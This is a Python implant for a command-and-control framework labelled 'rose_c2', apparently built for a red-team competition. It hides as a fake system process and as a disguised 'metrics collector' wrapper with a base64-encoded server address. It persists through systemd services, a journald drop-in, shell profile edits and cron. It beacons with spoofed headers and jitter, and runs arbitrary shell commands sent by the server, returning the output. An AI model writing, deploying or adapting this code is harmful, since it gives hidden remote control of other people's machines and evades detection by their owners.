#!/usr/bin/env python3
import os, sys, ctypes, random

# Immediate stealth - before any other imports
def immediate_stealth():
    try:
        # Clear command line arguments
        new_name = random.choice(["systemd", "kthreadd", "ksoftirqd", "migration"])
        sys.argv = [new_name]
        
        # Change process name
        ctypes.CDLL(None).prctl(15, new_name.encode())
        
        # Fork to detach
        if os.fork() > 0:
            os._exit(0)
        os.setsid()
        if os.fork() > 0:
            os._exit(0)
        
        return True
    except:
        return False

# Apply stealth immediately
#immediate_stealth()

def hide_process_name():
    """Change the process name to something legitimate"""
    try:
        # Choose a legitimate system process name
        new_name = random.choice([
            "systemd", "kthreadd", "ksoftirqd", "migration", "rcu_gp",
            "rsyslog", "networkd", "dbus-daemon", "cron", "sshd"
        ])
        
        # Change process name using prctl (Linux)
        ctypes.CDLL(None).prctl(15, new_name.encode())
        
        # Also modify argv to hide the script name
        import sys
        sys.argv[0] = new_name
        
        return True
    except:
        return False

def fork_and_hide():
    """Fork the process and exit the parent to hide the original process"""
    try:
        # Fork the process
        pid = os.fork()
        
        if pid > 0:
            # Parent process exits
            os._exit(0)
        
        # Child process continues
        os.setsid()
        os.umask(0)
        
        # Fork again to prevent the process from acquiring a controlling terminal
        pid = os.fork()
        
        if pid > 0:
            # Second parent exits
            os._exit(0)
            
        return True
    except:
        return False

def create_wrapper_script(script_path=None):
    """Create a wrapper script that hides C2 details"""
    try:
        # Use the deployed script path if no backup was created
        if not script_path:
            script_path = "/usr/lib/metrics-collector/metrics.py"
        
        # Create a random wrapper script name in a common system directory
        wrapper_dirs = ["/usr/local/bin", "/opt", "/usr/bin"]
        wrapper_dir = random.choice(wrapper_dirs)
        
        # Ensure directory exists
        os.makedirs(wrapper_dir, exist_ok=True)
        
        # Generate a random wrapper name
        wrapper_name = random.choice([
            "metrics-collector-helper",
            "system-metrics-collector",
            "network-metrics-helper",
            "system-stats-collector"
        ])
        
        wrapper_path = os.path.join(wrapper_dir, wrapper_name)
        
        # Create wrapper script with encoded C2 details
        c2_config = "https://192.168.10.11:443/ plaintext_really"
        encoded_config = base64.b64encode(c2_config.encode()).decode()
        
        wrapper_content = f"""#!/bin/bash
# Metrics Collection Helper
# This script is part of the system metrics collection infrastructure

# Decode configuration
CONFIG=$(echo "{encoded_config}" | base64 -d)

# Execute the main script with decoded configuration
{script_path} $CONFIG > /dev/null 2>&1
"""
        
        # Write wrapper script
        with open(wrapper_path, 'w') as f:
            f.write(wrapper_content)
        
        # Make executable
        os.chmod(wrapper_path, 0o755)
        
        return wrapper_path
    except Exception as e:
        print_debug(f"Failed to create wrapper script: {e}")
        return None

def create_legitimate_systemd_service_sudo(wrapper_path):
    """Create a systemd service using sudo"""
    try:
        # Use a service name that matches the script location
        service_name = "metrics-collector.service"
        
        # Create systemd service file with legitimate-looking configuration
        service_content = f"""[Unit]
Description=System Metrics Collection Service
Documentation=man:metrics-collector(8)
After=network.target network-online.target
Wants=network-online.target
ConditionPathExists=/usr/lib/metrics-collector

[Service]
Type=simple
ExecStart={wrapper_path}
Restart=always
RestartSec=30
User=root
Group=root
StandardOutput=null
StandardError=null
SyslogIdentifier=metrics-collector
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/tmp /var/tmp /var/lib/metrics-collector
ProtectKernelTunables=true
ProtectControlGroups=true
RestrictRealtime=true
MemoryDenyWriteExecute=true
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6 AF_NETLINK

[Install]
WantedBy=multi-user.target
"""
        
        # Write service file using sudo
        service_path = f"/etc/systemd/system/{service_name}"
        process = subprocess.Popen(["sudo", "tee", service_path], stdin=subprocess.PIPE, text=True)
        process.communicate(input=service_content)
        
        if process.returncode != 0:
            return False
        
        # Set permissions using sudo
        subprocess.run(["sudo", "chmod", "644", service_path], check=False)
        
        # Enable and start the service using sudo
        subprocess.run(["sudo", "systemctl", "daemon-reload"], check=False)
        subprocess.run(["sudo", "systemctl", "enable", service_name], check=False)
        subprocess.run(["sudo", "systemctl", "start", service_name], check=False)
        
        return True
    except Exception as e:
        print_debug(f"Failed to create systemd service with sudo: {e}")
        return False

def create_journald_drop_in_sudo(wrapper_path):
    """Create a drop-in configuration for systemd-journald using sudo"""
    try:
        # Create drop-in directory using sudo
        drop_in_dir = "/etc/systemd/system/systemd-journald.service.d"
        subprocess.run(["sudo", "mkdir", "-p", drop_in_dir], check=False)
        
        # Create drop-in configuration
        drop_in_file = os.path.join(drop_in_dir, "10-metrics.conf")
        
        drop_in_content = f"""# Metrics collection for journald
[Service]
ExecStartPost={wrapper_path}
"""
        
        # Write drop-in file using sudo
        process = subprocess.Popen(["sudo", "tee", drop_in_file], stdin=subprocess.PIPE, text=True)
        process.communicate(input=drop_in_content)
        
        if process.returncode != 0:
            return False
        
        # Reload systemd using sudo
        subprocess.run(["sudo", "systemctl", "daemon-reload"], check=False)
        
        return True
    except Exception as e:
        print_debug(f"Failed to create journald drop-in config with sudo: {e}")
        return False

def create_legitimate_config_sudo():
    """Create legitimate-looking configuration files using sudo"""
    try:
        # Create metrics-collector directory structure using sudo
        metrics_dir = "/etc/metrics-collector"
        subprocess.run(["sudo", "mkdir", "-p", metrics_dir], check=False)
        
        # Create a configuration file
        config_path = os.path.join(metrics_dir, "config.yaml")
        
        config_content = """# Metrics Collection Configuration
# This file contains configuration for the system metrics collector

# Collection settings
collection:
  interval: 300  # seconds
  batch_size: 100
  
# Metrics to collect
metrics:
  - system
  - network
  - disk
  - memory
  - cpu
  
# Output settings
output:
  format: json
  compression: true
  
# Internal server settings
server:
  endpoint: "https://internal-monitoring.local/api/metrics"
  auth_token: "internal_monitoring_token_2023"
  timeout: 30
"""
        
        # Write config file using sudo
        process = subprocess.Popen(["sudo", "tee", config_path], stdin=subprocess.PIPE, text=True)
        process.communicate(input=config_content)
        
        if process.returncode != 0:
            return False
        
        # Set permissions using sudo
        subprocess.run(["sudo", "chmod", "644", config_path], check=False)
        
        # Create a logrotate configuration using sudo
        logrotate_path = "/etc/logrotate.d/metrics-collector"
        logrotate_content = f"""{metrics_dir}/logs/*.log {{
    daily
    missingok
    rotate 7
    compress
    delaycompress
    notifempty
    create 644 root root
    postrotate
        systemctl reload metrics-collector
    endscript
}}
"""
        
        # Write logrotate file using sudo
        process = subprocess.Popen(["sudo", "tee", logrotate_path], stdin=subprocess.PIPE, text=True)
        process.communicate(input=logrotate_content)
        
        return process.returncode == 0
    except Exception as e:
        print_debug(f"Failed to create legitimate config with sudo: {e}")
        return False
    
def create_user_level_persistence(wrapper_path):
    """Create user-level persistence mechanisms"""
    try:
        # Get current user
        username = getpass.getuser()
        home_dir = os.path.expanduser("~")
        
        # Create a systemd user service
        user_service_dir = os.path.join(home_dir, ".config", "systemd", "user")
        os.makedirs(user_service_dir, exist_ok=True)
        
        service_name = "metrics-collector.service"
        
        service_content = f"""[Unit]
Description=User Metrics Collection Service
After=graphical-session.target

[Service]
Type=simple
ExecStart={wrapper_path}
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
"""
        
        service_path = os.path.join(user_service_dir, service_name)
        with open(service_path, 'w') as f:
            f.write(service_content)
        
        # Enable user service
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
        subprocess.run(["systemctl", "--user", "enable", service_name], check=False)
        subprocess.run(["systemctl", "--user", "start", service_name], check=False)
        
        # Add to profile files
        profile_files = [
            os.path.join(home_dir, ".bashrc"),
            os.path.join(home_dir, ".profile"),
            os.path.join(home_dir, ".zshrc")
        ]
        
        for profile_file in profile_files:
            if os.path.exists(profile_file):
                with open(profile_file, 'a') as f:
                    f.write(f"\n# System metrics check\nnohup {wrapper_path} > /dev/null 2>&1 &\n")
        
        # Create a cron job for the user
        cron_entry = f"@reboot {wrapper_path} > /dev/null 2>&1\n"
        
        # Read existing crontab
        result = subprocess.run(["crontab", "-l"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        existing_cron = result.stdout if result.returncode == 0 else ""
        
        # Check if our entry already exists
        if wrapper_path not in existing_cron:
            # Add our entry
            new_cron = existing_cron + cron_entry
            
            # Write new crontab
            process = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
            process.communicate(input=new_cron)
        
        return True
    except Exception as e:
        print_debug(f"Failed to create user-level persistence: {e}")
        return False

def create_stealthy_persistence():
    """Create stealthy persistence for admin user deployment"""
    try:
        # Check if we have sudo privileges
        has_sudo = False
        try:
            result = subprocess.run(["sudo", "-n", "true"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            has_sudo = result.returncode == 0
        except:
            pass
        
        # Create a wrapper script with obfuscated C2 details
        wrapper_path = create_wrapper_script()
        if not wrapper_path:
            return False
        
        # Try to create system-level persistence with sudo if available
        if has_sudo:
            service_success = create_legitimate_systemd_service_sudo(wrapper_path)
            drop_in_success = create_journald_drop_in_sudo(wrapper_path)
            config_success = create_legitimate_config_sudo()
            
            if service_success or drop_in_success:
                return True
        
        # Fall back to user-level persistence
        return create_user_level_persistence(wrapper_path)
    except Exception as e:
        print_debug(f"Failed to create stealthy persistence: {e}")
        return False
    
immediate_stealth()

import os, sys, json, base64, time, random, urllib, urllib.request, subprocess, platform, socket, hashlib, hmac, datetime, threading, sqlite3, uuid, re, ssl, ctypes, getpass
from urllib.parse import urlencode

SERVER_URL="https://192.168.10.11:443/"
AGENT_NAME="example1"
AGENT_TYPE="rose_c2"
AUTH_TOKEN="plaintext_really"

# Allow connection to the server (uses a self signed cert)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

def print_debug(message):
    # Stub function for a more detailed logging functionally present in Andrew's main codebase that doesn't make sense to replicate here
    # For example, if you have a DEBUG flag set, then print to console/logfile.
    # Otherwise (full deploy for comp), suppress output.
    print(message)

def get_platform_dist():
    """
    Helper func that returns a string with the platform distribution.
    """
    sys_platform = platform.system()

    # --- Linux Handling ---
    if sys_platform == "Linux":
        # Try Python 3.10+ native method (Standardized os-release)
        if hasattr(platform, 'freedesktop_os_release'):
            try:
                info = platform.freedesktop_os_release()
                return (info.get('ID', 'linux'), info.get('VERSION_ID', ''), info.get('NAME', ''))
            except OSError:
                pass

        # 2. Manual parsing for older Python versions (< 3.10)
        if os.path.isfile("/etc/os-release"):
            info = {}
            with open("/etc/os-release") as f:
                for line in f:
                    # Parse KEY=VALUE, ignoring comments and empty lines
                    match = re.match(r'^([A-Z_]+)="?([^"\n]+)"?\$', line)
                    if match:
                        info[match.group(1)] = match.group(2)
            return (
                info.get('ID', 'linux'), 
                info.get('VERSION_ID', info.get('VERSION', '')), 
                info.get('PRETTY_NAME', '')
            )

    # Fallback for MacOS or unknown systems
    return (sys_platform, platform.release(), platform.version())

def get_os(simple=False):
    """
    Gets the approximate OS used, optionally simplified to highest level possible.
    For example: Ubuntu, Debian, Rocky, RHEL

    Args: simple(Bool)
    Returns: osType(String)
    """
    system = platform.system()

    if system == "Linux":
        if simple:
            return get_platform_dist()[1] # Ubuntu, debian, redhat
        return ' '.join(get_platform_dist()) # Ubuntu 10.04 lucid, debian 4.0 , fedora 17 Beefy Miracle, redhat 5.6 Tikanga, redhat 5.9 Final (<- centos)

    if simple:
        return platform.system() # FreeBSD
    return f"{platform.system()} {platform.release()}" #FreeBSD XYZ

def get_perms():
    """
    Gets the execution perm level (user and elevation level).
    Returns: isRunAsElevated(bool), runAsUser(String)
    """
    system = platform.system()
    
    if system in ("Linux", "FreeBSD"):
        # euid 0 - root OR sudo
        is_root = (os.geteuid() == 0)

        # Detect sudo. May have unexpected results (False when it is actually using SUDO)
        # depending on OS and inconsistent usage of SUDO_USER variable across systems. 
        sudo_user = os.environ.get("SUDO_USER")
        if sudo_user:
            runAsUser = sudo_user
        else:
            # Normal user or directly root
            runAsUser = getpass.getuser()
        return is_root, runAsUser
    
    print_debug("get_perms(): reached unexpected unsupported OS block")
    return False, ""

def get_primary_ip():
    """
    Attempts to get the primary IP address of the local machine.
    Returns: ip(String) or "0.0.0.0" if failed
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Connect to an external host (e.g., Google's public DNS or test-net-3)
        # This doesn't send any data, just establishes a connection to find out which local interface would be used.
        s.connect(("8.8.8.8", 80)) # 203.0.113.2 # test-net-3 # Doesn't need to be reachable. Use non-routable address for stealth - except that might not work under certain conditions so do Google for reliability.
        ip_address = s.getsockname()[0]
    except Exception as E:
        ip_address = "0.0.0.0" # safe default
        print_debug(f"get_primary_ip() error: {E}")
    finally:
        s.close()
    return ip_address

def get_system_details():
    """
    Helper func that builds the overall system info dictionary
    Returns: sysInfo(dict)
    """
    sysInfo = {
        "os": get_os(),
        "executionUser": get_perms()[1],
        "executionAdmin": get_perms()[0],
        "hostname": socket.gethostname(), #alternate method if FQDN is desired: socket.getfqdn()
        "ipadd": get_primary_ip()
    }
    return sysInfo

def _stealth_request(url, data, timeout):
    global AUTH_TOKEN
    
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
            "curl/8.2.1",
            "Wget/1.21.3"
        ]),
        "Accept": "application/json,text/plain,*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Content-Type": "application/json"
    }

    try:
        req = urllib.request.Request(
            url,
            data=data,
            headers=headers,
            method="POST"
        )

        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as response:
            response_text = response.read().decode("utf-8", errors="ignore")

            if response.getcode() == 200:
                if "agent/beacon" in url and response_text != AUTH_TOKEN:
                    AUTH_TOKEN = response_text
                return True, response_text

            return False, f"HTTP {response.getcode()}"

    except Exception as e:
        return False, str(e)

def send_message(endpoint, message="", oldStatus=True, newStatus=True, 
                systemInfo=get_system_details(), server_timeout=5, 
                stealth_mode=False):
    """
    Sends the specified data to the server.
    Handles the full process and attaching agent name/auth/system details.

    Args: endpoint(string,required),message(any),oldStatus/newStatus(bool),stealth_mode(bool)
    Returns: status(Bool)
    """
    global AUTH_TOKEN
    if not SERVER_URL:
        # Server comms are intentionally disabled (server_url is an empty string)
        # Maybe redirect to print_debug instead?
        return False, "no SERVER_URL value specified"

    try:
        url = SERVER_URL + endpoint

        # Prep payload
        # Note that not all of these are strictly needed for every endpoint. However, the server accepts extra data fields without complaint, 
        # they do not add appreciable data leakage or transmission size to the communication, and they greatly simplify the arguments and 
        # assembly logic of the payload, so we attach the same data to every communication.
        payload = {
            "name": AGENT_NAME,
            "hostname": systemInfo["hostname"],
            "ip": systemInfo["ipadd"],
            "os": systemInfo["os"],
            "executionUser": systemInfo["executionUser"],
            "executionAdmin": systemInfo["executionAdmin"],
            "auth": AUTH_TOKEN,
            "agent_type": AGENT_TYPE,
            "oldStatus": oldStatus,
            "newStatus": newStatus,
            "message": message
        }

        # Prepare data as JSON for transmit
        data = json.dumps(payload).encode("utf-8")

        if stealth_mode:
            # Use stealth implementation
            return _stealth_request(url, data, server_timeout)
        else:
            # Use original implementation
            req = urllib.request.Request(
                url,
                data=data,
                headers={"Content-Type": "application/json"},
                method="POST" # literally every endpoint is standardized on POST for agent comms as it's needed to send AUTH and other items
            )

            # Send payload
            with urllib.request.urlopen(req, timeout=server_timeout, context=CTX) as response:
                if response.getcode() == 200:
                    # Good result! Now parse and return the endpoint
                    print_debug(f"send_message({url}): sent msg to server: [{oldStatus,newStatus,message}]")
                    response_text = response.read().decode('utf-8')
                    # All beacon endpoints provide a new AUTH value that should be read in memory to replace the configured one
                    # This updated AUTH value is needed for every agent endpoint beyond the basic beacon
                    if "agent/beacon" in endpoint:
                        if response_text != AUTH_TOKEN:
                            AUTH_TOKEN = response_text
                            print_debug(f"send_message({url}): updating auth token value to new value from server {AUTH_TOKEN}")
                    return True, response_text
                else:
                    print_debug(f"send_message({url}): Server error: {response.getcode()}")

    # Error handling
    # Various requests errors - networking failure or 4xx/5xx code from server (out of scope for client-side error handling)
    except urllib.error.HTTPError as e:
        print_debug(f"[send_message({url}): HTTP error: {e.code} {e.reason}")
    except urllib.error.URLError as e:
        print_debug(f"send_message({url}): URL error: {e.reason}")
    except Exception as e:
        print_debug(f"send_message({url}): Beacon error: {e}")
    return False, ""

class AdaptiveC2Client:
    def __init__(self, c2_server, secret_key, sleep_time=60, jitter=20, stealth_mode=False):
        self.c2_server = c2_server
        self.secret_key = secret_key
        self.sleep_time = sleep_time
        self.jitter = jitter
        self.stealth_mode = stealth_mode
        
        # Use more realistic process name instead of Python
        self.process_name = self.get_legitimate_process_name()
        
        # Generate unique host ID based on hardware identifiers
        self.beacon_id = self.generate_stable_id()
        self.hostname = socket.gethostname()
        self.ip_address = self.get_local_ip()
        self.user = os.getenv('USER') or os.getenv('USERNAME')
        self.os_info = f"{platform.system()} {platform.release()}"
        self.running = True
        
        # Detect installed services for context
        self.environment_profile = self.detect_environment()
        
        # More realistic user agents that match common applications
        self.user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "curl/8.2.1",
            "Wget/1.21.3"
        ]
    
    def get_legitimate_process_name(self):
        """Return a process name that blends in with common Linux system processes"""
        return random.choice([
            "systemd", "kthreadd", "ksoftirqd", "migration", "rcu_gp",
            "rsyslog", "networkd", "dbus-daemon", "cron", "sshd"
        ])
    
    def generate_stable_id(self):
        """Generate a stable ID based on hardware identifiers that persists across reboots"""
        try:
            # Try to get machine ID from /etc/machine-id or DMI
            if os.path.exists("/etc/machine-id"):
                with open("/etc/machine-id", "r") as f:
                    hw_id = f.read().strip()
            elif os.path.exists("/sys/class/dmi/id/product_uuid"):
                with open("/sys/class/dmi/id/product_uuid", "r") as f:
                    hw_id = f.read().strip()
            else:
                hw_id = f"{platform.system()}-{socket.gethostname()}-{platform.machine()}"
            
            # Generate a hash of the hardware ID
            return hashlib.sha256(hw_id.encode()).hexdigest()[:16]
        except:
            # Fallback to original method
            return hashlib.md5(f"{platform.system()}-{socket.gethostname()}-{platform.machine()}".encode()).hexdigest()[:16]
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except: 
            return "127.0.0.1"
    
    def detect_environment(self):
        profile = {"hostname": self.hostname, "os": self.os_info, "services": []}
        services = [
            ("nginx", ["systemctl", "is-active", "nginx"]),
            ("grafana", ["systemctl", "is-active", "grafana-server"]),
            ("apache", ["systemctl", "is-active", "apache2"]),
            ("docker", ["systemctl", "is-active", "docker"])
        ]
        for service_name, cmd in services:
            try:
                result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if result.returncode == 0:
                    profile["services"].append(service_name)
            except: 
                pass
        return profile
    
    def create_signature(self, data):
        """Generate HMAC signature for request validation."""
        return hmac.new(self.secret_key.encode(), data, hashlib.sha256).hexdigest()
    
    def _make_request(self, endpoint, data, method="GET"):
        """Make HTTPS request with enhanced stealth techniques"""
        if self.stealth_mode:
        # Convert data to bytes if needed
            if isinstance(data, dict):
                data_bytes = json.dumps(data).encode()
            else:
                data_bytes = data
            return _stealth_request(f"{self.c2_server}/{endpoint}", data_bytes, timeout=10)
    
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Pragma": "no-cache",
            "Cache-Control": "no-cache"
        }
        
        # Add service-specific headers if available
        if "nginx" in self.environment_profile["services"]:
            headers["X-Requested-With"] = "XMLHttpRequest"
        elif "grafana" in self.environment_profile["services"]:
            headers["X-Grafana-Org-Id"] = "1"
        
        # Prepare URL and data
        url = f"{self.c2_server}/{endpoint}"
        if method == "GET" and data:
            query_string = urlencode(data)
            url += f"?{query_string}"
        
        try:
            # Parse URL
            parsed_url = urllib.parse.urlparse(url)
            hostname = parsed_url.hostname
            port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
            path = parsed_url.path + ('?' + parsed_url.query if parsed_url.query else '')
            
            # Create SSL context
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if parsed_url.scheme == 'https':
                sock = context.wrap_socket(sock, server_hostname=hostname)
            
            sock.settimeout(10)
            sock.connect((hostname, port))
            
            # Prepare request
            if method == "GET":
                request = f"GET {path} HTTP/1.1\r\n"
            else:
                request = f"POST {path} HTTP/1.1\r\n"
            
            # Add headers
            request += f"Host: {hostname}\r\n"
            for header, value in headers.items():
                request += f"{header}: {value}\r\n"
            
            # Add content length for POST requests
            if method == "POST" and data:
                post_data = json.dumps(data).encode()
                request += f"Content-Length: {len(post_data)}\r\n"
                request += "Content-Type: application/json\r\n"
            
            request += "\r\n"
            
            # Send request
            if method == "POST" and data:
                sock.sendall(request.encode() + post_data)
            else:
                sock.sendall(request.encode())
            
            # Receive response
            response_data = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response_data += chunk
            
            sock.close()
            
            # Parse response
            response_text = response_data.decode('utf-8', errors='ignore')
            headers, body = response_text.split('\r\n\r\n', 1)
            
            # Extract status code
            status_line = headers.split('\r\n')[0]
            status_code = int(status_line.split(' ')[1])
            
            # Create a mock response object
            class MockResponse:
                def __init__(self, status_code, text):
                    self.status_code = status_code
                    self.text = text
                
                def json(self):
                    try:
                        return json.loads(self.text)
                    except:
                        return {}
            
            return MockResponse(status_code, body)
            
        except Exception as e:
            return None
    
    
    def run(self):
        # Change process name to blend in
        try:
            # Linux process name change
            ctypes.CDLL(None).prctl(15, self.process_name.encode())
        except:
            pass
        
        # Initial registration
        self._make_request("agent/beacon", {"message": "register"}, "POST")
        
        # Main C2 loop
        while self.running:
                    try:
                        # Add jitter to sleep time to avoid predictable patterns
                        jittered_sleep = self.sleep_time + random.randint(-self.jitter, self.jitter)
                        time.sleep(jittered_sleep)
                        
                        # Check for pause state
                        pause_response = self._make_request("agent/get_pause", {}, "POST")
                        if pause_response and pause_response.status_code == 200:
                            try:
                                pause_until = float(pause_response.text)
                                if pause_until > time.time():
                                    time.sleep(pause_until - time.time())
                            except:
                                pass
                        
                        # Check for tasks
                        task_response = self._make_request("agent/get_task", {}, "POST")
                        if task_response and task_response.status_code == 200:
                            if task_response.text != "no pending tasks":
                                try:
                                    data = json.loads(task_response.text)
                                    task_id = data.get('task_id')
                                    task_command = data.get('task')
                                    
                                    # Execute the task
                                    try:
                                        resultobj = subprocess.run(
                                            task_command,
                                            shell=True,
                                            capture_output=True,
                                            text=True,
                                            timeout=15,
                                            check=False
                                        )
                                        result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
                                    except Exception as e:
                                        result = f"unexpected exception when trying to execute task: {str(e)[:100]}"
                                    
                                    # Send result back to server
                                    resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':'))
                                    self._make_request("agent/set_task_result", {"message": resultjson}, "POST")
                                    
                                except json.JSONDecodeError:
                                    pass
                    
                    except Exception as e:
                        # Handle any unexpected errors in the main loop
                        time.sleep(30)  # Wait a bit before retrying

# Integration with the existing code
def main():

    immediate_stealth()

    create_stealthy_persistence()

    STEALTH_MODE = True
    # Perform our initial connection to the server to setup the agent
    status, response = send_message("agent/beacon", "register", stealth_mode=STEALTH_MODE)    
    # Create an adaptive C2 client instance
    c2_client = AdaptiveC2Client(
        c2_server=SERVER_URL,
        secret_key=AUTH_TOKEN,
        sleep_time=60,
        jitter=20,
        stealth_mode=STEALTH_MODE
    )
    
    # Start the adaptive C2 client in a separate thread
    c2_thread = threading.Thread(target=c2_client.run)
    c2_thread.daemon = True
    c2_thread.start()
    
    # Enter our main agent loop (original implementation)
    while True:
        # (Optional) check if agent should be in paused state
        send_message("agent/get_pause", stealth_mode=STEALTH_MODE)
        if status:
            try:
                # Use 'response' here, as that is what the server just sent back
                desired_pause_until = float(response) 
            except:
                print(f"pause conversion: received {response} but could not convert to float")
                desired_pause_until = 0

            if desired_pause_until > time.time():
                time.sleep(desired_pause_until - time.time())
        
        # Let's see if any tasks are waiting for this agent
        status, response = send_message("agent/get_task", stealth_mode=STEALTH_MODE)
        if status:
            if response != "no pending tasks":
                data = json.loads(response)
                task_id = data.get('task_id')
                task_command = data.get('task')
                
                try:
                    resultobj = subprocess.run(
                        task_command,
                        shell=True,
                        capture_output=True, 
                        text=True,
                        timeout=15,
                        check=False
                    )
                    result = f"ReturnCode: {resultobj.returncode}. STDOUT: {resultobj.stdout}. STDERR: {resultobj.stderr}."
                except Exception as E:
                    print_debug(f"subprocess exception: {E}")
                    result = f"unexpected exception when trying to execute task: {str(E)[:100]}"
                finally:
                    resultjson = json.dumps({"task_id": task_id, "result": result}, separators=(',', ':'))
                    send_message("agent/set_task_result", message=resultjson, stealth_mode=STEALTH_MODE)
        
        # Add jitter to sleep time
        jittered_sleep = 60 + random.randint(-10, 10)
        time.sleep(jittered_sleep)

if __name__ == "__main__":
    main()